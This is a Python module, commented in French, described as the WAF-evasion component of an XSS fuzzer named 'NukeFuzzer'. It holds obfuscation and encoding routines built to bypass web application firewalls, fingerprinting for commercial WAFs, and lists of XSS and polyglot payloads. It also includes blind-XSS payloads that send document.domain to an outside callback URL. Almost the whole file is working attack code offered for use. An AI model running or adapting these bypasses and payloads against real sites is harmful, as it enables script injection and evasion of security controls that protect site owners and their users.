#!/usr/bin/env python3
"""
Module d'évasion WAF et de techniques avancées pour NukeFuzzer v2.0
"""

import random
import time
import urllib.parse
import base64
import hashlib
import string
import re
from typing import List, Dict, Optional, Tuple

class WAFEvasionTechniques:
    """Classe pour les techniques d'évasion WAF"""
    
    def __init__(self):
        self.case_variations = [
            lambda x: x.upper(),
            lambda x: x.lower(),
            lambda x: ''.join(random.choice([c.upper(), c.lower()]) for c in x),
            lambda x: x.capitalize(),
            lambda x: x.swapcase()
        ]
        
        self.space_replacements = [
            '\t', '\n', '\r', '\f', '\v', '/**/', '/**//**/', 
            '+', '%20', '%09', '%0a', '%0c', '%0d', '%0b',
            '&nbsp;', '&#x20;', '&#32;', '&#x09;', '&#9;'
        ]
        
        self.comment_insertions = [
            '/**/', '<!--', '-->', '/*comment*/', '//comment',
            '/**//**/', '<!--comment-->', '/*\x00*/', '/*\n*/'
        ]
        
        self.quote_variations = [
            '"', "'", '`', '\\x22', '\\u0022', '&quot;', '&#34;', 
            '&#x22;', '\\x27', '\\u0027', '&#39;', '&#x27;'
        ]
        
        self.tag_variations = [
            '<', '&lt;', '&#60;', '&#x3c;', '\\x3c', '\\u003c',
            '>', '&gt;', '&#62;', '&#x3e;', '\\x3e', '\\u003e'
        ]
        
        self.protocol_variations = [
            'javascript:', 'javascript://', 'javascript:void(0)//',
            'data:', 'data:text/html,', 'data:text/javascript,',
            'vbscript:', 'about:', 'chrome:', 'chrome-extension:'
        ]
        
        self.event_handlers = [
            'onload', 'onerror', 'onmouseover', 'onmouseout', 'onfocus',
            'onblur', 'onchange', 'oninput', 'onkeydown', 'onkeyup',
            'onsubmit', 'onreset', 'onselect', 'onresize', 'onscroll',
            'onclick', 'ondblclick', 'oncontextmenu', 'ondrag', 'ondrop',
            'onanimationstart', 'onanimationend', 'ontransitionend',
            'onwebkitanimationstart', 'onwebkitanimationend', 'onwebkittransitionend'
        ]
    
    def apply_case_variation(self, payload: str) -> str:
        """Applique une variation de casse"""
        variation = random.choice(self.case_variations)
        return variation(payload)
    
    def apply_space_variation(self, payload: str) -> str:
        """Remplace les espaces par des alternatives"""
        space_replacement = random.choice(self.space_replacements)
        return payload.replace(' ', space_replacement)
    
    def apply_comment_insertion(self, payload: str) -> str:
        """Insert des commentaires pour brouiller les filtres"""
        comment = random.choice(self.comment_insertions)
        # Insertion aléatoire de commentaires
        positions = [i for i, char in enumerate(payload) if char in '<>="\'']
        if positions:
            pos = random.choice(positions)
            return payload[:pos] + comment + payload[pos:]
        return payload + comment
    
    def apply_encoding_variation(self, payload: str) -> str:
        """Applique différents types d'encodage"""
        encodings = [
            lambda x: urllib.parse.quote(x),
            lambda x: urllib.parse.quote(x, safe=''),
            lambda x: ''.join(f'%{ord(c):02x}' for c in x),
            lambda x: ''.join(f'&#x{ord(c):02x};' for c in x),
            lambda x: ''.join(f'&#{ord(c)};' for c in x),
            lambda x: ''.join(f'\\x{ord(c):02x}' for c in x),
            lambda x: ''.join(f'\\u{ord(c):04x}' for c in x),
            lambda x: base64.b64encode(x.encode()).decode()
        ]
        
        encoding = random.choice(encodings)
        return encoding(payload)
    
    def apply_double_encoding(self, payload: str) -> str:
        """Applique un double encodage"""
        return urllib.parse.quote(urllib.parse.quote(payload))
    
    def apply_mixed_encoding(self, payload: str) -> str:
        """Applique un encodage mixte (certains caractères encodés, d'autres non)"""
        result = ""
        for char in payload:
            if random.choice([True, False]):
                result += f'%{ord(char):02x}'
            else:
                result += char
        return result
    
    def apply_unicode_normalization(self, payload: str) -> str:
        """Applique la normalisation Unicode"""
        import unicodedata
        normalized = unicodedata.normalize('NFKD', payload)
        return ''.join(char for char in normalized if not unicodedata.combining(char))
    
    def apply_tag_variation(self, payload: str) -> str:
        """Varie les balises HTML"""
        for original, replacement in zip(['<', '>'], ['&lt;', '&gt;']):
            if random.choice([True, False]):
                payload = payload.replace(original, replacement)
        return payload
    
    def apply_protocol_variation(self, payload: str) -> str:
        """Varie les protocols"""
        if 'javascript:' in payload:
            new_protocol = random.choice(self.protocol_variations)
            payload = payload.replace('javascript:', new_protocol)
        return payload
    
    def apply_event_handler_variation(self, payload: str) -> str:
        """Varie les gestionnaires d'événements"""
        for handler in self.event_handlers:
            if handler in payload.lower():
                # Variation de casse
                new_handler = ''.join(random.choice([c.upper(), c.lower()]) for c in handler)
                payload = re.sub(re.escape(handler), new_handler, payload, flags=re.IGNORECASE)
                break
        return payload
    
    def apply_javascript_obfuscation(self, payload: str) -> str:
        """Obfuscation JavaScript"""
        obfuscations = [
            lambda x: x.replace('alert', 'window["alert"]'),
            lambda x: x.replace('alert', 'top["alert"]'),
            lambda x: x.replace('alert', 'parent["alert"]'),
            lambda x: x.replace('alert', 'self["alert"]'),
            lambda x: x.replace('alert', 'frames["alert"]'),
            lambda x: x.replace('alert', 'globalThis["alert"]'),
            lambda x: x.replace('alert(', 'setTimeout("alert('),
            lambda x: x.replace('alert(', 'setInterval("alert('),
            lambda x: x.replace('alert(', 'Function("alert("'),
            lambda x: x.replace('alert(', 'eval("alert("'),
            lambda x: x.replace('alert(', '[]["constructor"]["constructor"]("alert("'),
            lambda x: x.replace('alert(', '""["constructor"]["constructor"]("alert("'),
            lambda x: x.replace('alert(', '+/""/.constructor("alert("')
        ]
        
        if 'alert' in payload:
            obfuscation = random.choice(obfuscations)
            payload = obfuscation(payload)
        
        return payload
    
    def apply_string_concatenation(self, payload: str) -> str:
        """Applique la concaténation de chaînes"""
        if 'alert' in payload:
            # Remplace alert par une concaténation
            variations = [
                '"ale"+"rt"',
                '"al"+"er"+"t"',
                '"a"+"l"+"e"+"r"+"t"',
                'String.fromCharCode(97,108,101,114,116)',
                'atob("YWxlcnQ=")',  # base64 de "alert"
                '"alert".split("").join("")'
            ]
            replacement = random.choice(variations)
            payload = payload.replace('alert', replacement)
        
        return payload
    
    def apply_all_techniques(self, payload: str, num_techniques: int = 3) -> str:
        """Applique plusieurs techniques d'évasion"""
        techniques = [
            self.apply_case_variation,
            self.apply_space_variation,
            self.apply_comment_insertion,
            self.apply_encoding_variation,
            self.apply_mixed_encoding,
            self.apply_tag_variation,
            self.apply_protocol_variation,
            self.apply_event_handler_variation,
            self.apply_javascript_obfuscation,
            self.apply_string_concatenation
        ]
        
        selected_techniques = random.sample(techniques, min(num_techniques, len(techniques)))
        
        for technique in selected_techniques:
            try:
                payload = technique(payload)
            except Exception as e:
                continue  # Ignore les erreurs et continue
        
        return payload
    
    def generate_waf_bypass_variants(self, payload: str, count: int = 10) -> List[str]:
        """Génère plusieurs variantes d'évasion WAF"""
        variants = []
        
        for _ in range(count):
            variant = self.apply_all_techniques(payload, random.randint(1, 4))
            variants.append(variant)
        
        return list(set(variants))  # Supprime les doublons


class AdvancedTechniques:
    """Techniques avancées pour la détection XSS"""
    
    def __init__(self):
        self.waf_evasion = WAFEvasionTechniques()
        self.context_detection_patterns = {
            'html': [
                r'<[^>]*>',
                r'&[a-zA-Z]+;',
                r'&#\d+;',
                r'&#x[0-9a-fA-F]+;'
            ],
            'javascript': [
                r'<script[^>]*>',
                r'javascript:',
                r'eval\s*\(',
                r'setTimeout\s*\(',
                r'setInterval\s*\('
            ],
            'attribute': [
                r'[a-zA-Z]+\s*=\s*["\'][^"\']*["\']',
                r'on[a-zA-Z]+\s*=',
                r'style\s*=',
                r'href\s*=',
                r'src\s*='
            ],
            'url': [
                r'https?://',
                r'ftp://',
                r'file://',
                r'data:',
                r'javascript:'
            ]
        }
        
        self.blind_xss_indicators = [
            'burpcollaborator',
            'pingback',
            'callback',
            'webhook',
            'collaborator',
            'oastify',
            'interact'
        ]
    
    def detect_waf(self, response_headers: Dict[str, str], response_body: str) -> Optional[str]:
        """Détecte le type de WAF utilisé"""
        waf_signatures = {
            'cloudflare': [
                'cf-ray', 'cloudflare', '__cfduid', 'cf-cache-status'
            ],
            'cloudfront': [
                'x-amz-cf-id', 'x-amzn-requestid', 'cloudfront'
            ],
            'akamai': [
                'akamai', 'ak-rid', 'ak-sid'
            ],
            'incapsula': [
                'incap-', 'x-iinfo', 'incapsula'
            ],
            'sucuri': [
                'sucuri', 'x-sucuri-'
            ],
            'barracuda': [
                'barracuda', 'barra'
            ],
            'f5': [
                'f5-', 'bigip', 'x-waf-'
            ],
            'fortinet': [
                'fortinet', 'fortigate'
            ],
            'modsecurity': [
                'mod_security', 'modsecurity'
            ]
        }
        
        # Vérification des headers
        headers_str = ' '.join(f'{k}: {v}' for k, v in response_headers.items()).lower()
        
        for waf_name, signatures in waf_signatures.items():
            if any(sig in headers_str for sig in signatures):
                return waf_name
        
        # Vérification du body
        body_lower = response_body.lower()
        for waf_name, signatures in waf_signatures.items():
            if any(sig in body_lower for sig in signatures):
                return waf_name
        
        return None
    
    def detect_context(self, response_body: str, payload: str) -> str:
        """Détecte le contexte d'injection du payload"""
        payload_position = response_body.find(payload)
        if payload_position == -1:
            return 'none'
        
        # Analyse du contexte autour du payload
        context_start = max(0, payload_position - 100)
        context_end = min(len(response_body), payload_position + len(payload) + 100)
        context = response_body[context_start:context_end]
        
        # Détection des patterns
        for context_type, patterns in self.context_detection_patterns.items():
            if any(re.search(pattern, context, re.IGNORECASE) for pattern in patterns):
                return context_type
        
        return 'html'  # par défaut
    
    def analyze_response_for_xss(self, response_body: str, payload: str) -> Dict[str, any]:
        """Analyse la réponse pour détecter les XSS"""
        analysis = {
            'payload_reflected': payload in response_body,
            'payload_position': response_body.find(payload),
            'context': self.detect_context(response_body, payload),
            'potential_xss': False,
            'xss_type': None,
            'confidence': 0,
            'evidence': []
        }
        
        if analysis['payload_reflected']:
            # Analyse du contexte pour déterminer le type de XSS
            context = analysis['context']
            
            if context == 'html':
                analysis['xss_type'] = 'reflected'
                analysis['confidence'] = 70
                analysis['evidence'].append('Payload reflected in HTML context')
            elif context == 'javascript':
                analysis['xss_type'] = 'reflected'
                analysis['confidence'] = 80
                analysis['evidence'].append('Payload reflected in JavaScript context')
            elif context == 'attribute':
                analysis['xss_type'] = 'reflected'
                analysis['confidence'] = 60
                analysis['evidence'].append('Payload reflected in attribute context')
            
            # Vérification des indicateurs DOM XSS
            dom_indicators = [
                'document.write', 'innerHTML', 'outerHTML', 'location.href',
                'location.search', 'location.hash', 'document.URL'
            ]
            
            if any(indicator in response_body for indicator in dom_indicators):
                analysis['xss_type'] = 'dom'
                analysis['confidence'] += 20
                analysis['evidence'].append('DOM manipulation detected')
            
            # Vérification des indicateurs Blind XSS
            if any(indicator in payload.lower() for indicator in self.blind_xss_indicators):
                analysis['xss_type'] = 'blind'
                analysis['confidence'] = 90
                analysis['evidence'].append('Blind XSS callback detected')
            
            analysis['potential_xss'] = analysis['confidence'] > 50
        
        return analysis
    
    def generate_context_specific_payloads(self, context: str, count: int = 10) -> List[str]:
        """Génère des payloads spécifiques au contexte"""
        payloads = []
        
        if context == 'html':
            base_payloads = [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>',
                '<svg onload=alert("XSS")>',
                '<iframe src=javascript:alert("XSS")>'
            ]
        elif context == 'javascript':
            base_payloads = [
                'alert("XSS")',
                'confirm("XSS")',
                'prompt("XSS")',
                'eval("alert(\\"XSS\\")")'
            ]
        elif context == 'attribute':
            base_payloads = [
                '" onmouseover="alert(\'XSS\')"',
                '\' onfocus=\'alert("XSS")\' autofocus=\'',
                '" onload="alert(\'XSS\')"'
            ]
        elif context == 'url':
            base_payloads = [
                'javascript:alert("XSS")',
                'data:text/html,<script>alert("XSS")</script>',
                'vbscript:alert("XSS")'
            ]
        else:
            base_payloads = [
                '<script>alert("XSS")</script>',
                '<img src=x onerror=alert("XSS")>'
            ]
        
        # Génération de variantes avec évasion WAF
        for base_payload in base_payloads:
            payloads.append(base_payload)
            variants = self.waf_evasion.generate_waf_bypass_variants(base_payload, count // len(base_payloads))
            payloads.extend(variants)
        
        return payloads[:count]
    
    def generate_polyglot_payloads(self, count: int = 5) -> List[str]:
        """Génère des payloads polyglot"""
        polyglots = [
            'javascript:/*--></title></style></textarea></script></xmp><svg/onload=+/"/+/onmouseover=1/+/[*/[]/+alert(1)//',
            '"><svg/onload=alert(/XSS/)>',
            '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></script>">\'><script>alert(String.fromCharCode(88,83,83))</script>',
            '"><img src=x onerror=alert(\'XSS\')>',
            '"><iframe src=javascript:alert(\'XSS\')>',
            'javascript:/*--></title></style></textarea></script></xmp><svg/onload=+/"/+/onmouseover=1/+/[*/[]/+confirm(1)//',
            '"><svg/onload=confirm(/XSS/)>',
            '\';confirm(String.fromCharCode(88,83,83))//\';confirm(String.fromCharCode(88,83,83))//";confirm(String.fromCharCode(88,83,83))//";confirm(String.fromCharCode(88,83,83))//--></script>">\'><script>confirm(String.fromCharCode(88,83,83))</script>',
            '"><img src=x onerror=confirm(\'XSS\')>',
            '"><iframe src=javascript:confirm(\'XSS\')>'
        ]
        
        return polyglots[:count]
    
    def generate_blind_xss_payloads(self, callback_url: str, count: int = 10) -> List[str]:
        """Génère des payloads pour blind XSS"""
        payloads = []
        
        base_payloads = [
            f'<script>fetch("{callback_url}?blind="+document.domain)</script>',
            f'<img src=x onerror=fetch("{callback_url}?blind="+document.domain)>',
            f'<svg onload=fetch("{callback_url}?blind="+document.domain)>',
            f'<script>new Image().src="{callback_url}?blind="+document.domain</script>',
            f'<script>navigator.sendBeacon("{callback_url}?blind="+document.domain)</script>',
            f'<script>document.write("<img src={callback_url}?blind="+document.domain+">")</script>',
            f'<iframe src=javascript:fetch("{callback_url}?blind="+document.domain)>',
            f'<script>XMLHttpRequest.prototype.open.call(new XMLHttpRequest(),"GET","{callback_url}?blind="+document.domain,true)</script>',
            f'<script>eval("fetch(\\"{callback_url}?blind=\\"+document.domain)")</script>',
            f'<script>setTimeout(\'fetch("{callback_url}?blind="+document.domain)\',1000)</script>'
        ]
        
        # Génération de variantes avec évasion WAF
        for base_payload in base_payloads:
            payloads.append(base_payload)
            if len(payloads) >= count:
                break
        
        return payloads[:count]
    
    def is_likely_false_positive(self, analysis: Dict[str, any]) -> bool:
        """Détermine si un résultat est probablement un faux positif"""
        false_positive_indicators = [
            'error', 'exception', 'debug', 'test', 'sample',
            'placeholder', 'example', 'demo', 'template'
        ]
        
        # Vérification des indicateurs de faux positifs
        evidence_str = ' '.join(analysis.get('evidence', [])).lower()
        
        return any(indicator in evidence_str for indicator in false_positive_indicators)
    
    def calculate_risk_score(self, analysis: Dict[str, any]) -> int:
        """Calcule un score de risque pour la vulnérabilité"""
        base_score = analysis.get('confidence', 0)
        
        # Bonus pour certains types de XSS
        if analysis.get('xss_type') == 'dom':
            base_score += 10
        elif analysis.get('xss_type') == 'blind':
            base_score += 15
        
        # Malus pour les faux positifs probables
        if self.is_likely_false_positive(analysis):
            base_score -= 30
        
        return max(0, min(100, base_score))


# Instance globale
advanced_techniques = AdvancedTechniques()

# Fonctions utilitaires
def get_waf_bypass_variants(payload: str, count: int = 10) -> List[str]:
    """Fonction utilitaire pour obtenir des variantes d'évasion WAF"""
    return advanced_techniques.waf_evasion.generate_waf_bypass_variants(payload, count)

def analyze_xss_response(response_body: str, payload: str) -> Dict[str, any]:
    """Fonction utilitaire pour analyser une réponse XSS"""
    return advanced_techniques.analyze_response_for_xss(response_body, payload)

def generate_context_payloads(context: str, count: int = 10) -> List[str]:
    """Fonction utilitaire pour générer des payloads contextuels"""
    return advanced_techniques.generate_context_specific_payloads(context, count)


if __name__ == "__main__":
    # Test des techniques avancées
    print("=== Test des techniques avancées ===")
    
    # Test d'évasion WAF
    test_payload = '<script>alert("XSS")</script>'
    print(f"\nPayload original: {test_payload}")
    
    variants = get_waf_bypass_variants(test_payload, 5)
    print(f"\nVariantes d'évasion WAF:")
    for i, variant in enumerate(variants, 1):
        print(f"  {i}. {variant}")
    
    # Test de détection de contexte
    test_response = '<html><body><input value="USER_INPUT"><script>var x = "USER_INPUT";</script></body></html>'
    analysis = analyze_xss_response(test_response, "USER_INPUT")
    print(f"\nAnalyse de réponse:")
    print(f"  Contexte: {analysis['context']}")
    print(f"  Confiance: {analysis['confidence']}%")
    print(f"  XSS potentiel: {analysis['potential_xss']}")
    
    # Test de génération de payloads contextuels
    context_payloads = generate_context_payloads('html', 3)
    print(f"\nPayloads contextuels (HTML):")
    for i, payload in enumerate(context_payloads, 1):
        print(f"  {i}. {payload}")
    
    print(f"\nTests terminés avec succès!")